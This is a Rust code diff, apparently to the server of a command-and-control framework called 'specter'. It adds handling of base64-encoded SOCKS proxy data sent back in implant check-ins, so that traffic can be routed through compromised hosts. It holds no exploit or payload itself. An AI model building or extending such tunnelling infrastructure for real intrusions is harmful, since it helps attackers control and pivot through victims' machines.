@@ -1,3 +1,4 @@
+use base64::Engine as _;
 use specter_common::checkin::{
     parse_binary_checkin, serialize_binary_response, CheckinRequest, CheckinResponse,
     PendingTaskPayload,
@@ -102,6 +103,28 @@ pub async fn process_checkin(
 
     for tr in &request.task_results {
         let success = tr.status == "COMPLETE";
+        if tr.task_id == "socks_data" {
+            if success {
+                match base64::engine::general_purpose::STANDARD.decode(tr.result.as_bytes()) {
+                    Ok(data) => {
+                        if let Some(socks_manager) = state.socks_manager.as_ref() {
+                            socks_manager.route_message(&session_id, &data).await;
+                        }
+                    }
+                    Err(e) => {
+                        tracing::warn!("Failed to decode SOCKS module output: {e}");
+                    }
+                }
+            }
+            continue;
+        }
+
+        if let Some(socks_manager) = state.socks_manager.as_ref() {
+            socks_manager
+                .mark_started_task_result(&session_id, &tr.task_id, success)
+                .await;
+        }
+
         if let Err(e) = state
             .task_dispatcher
             .complete_task(&tr.task_id, tr.result.as_bytes(), success)
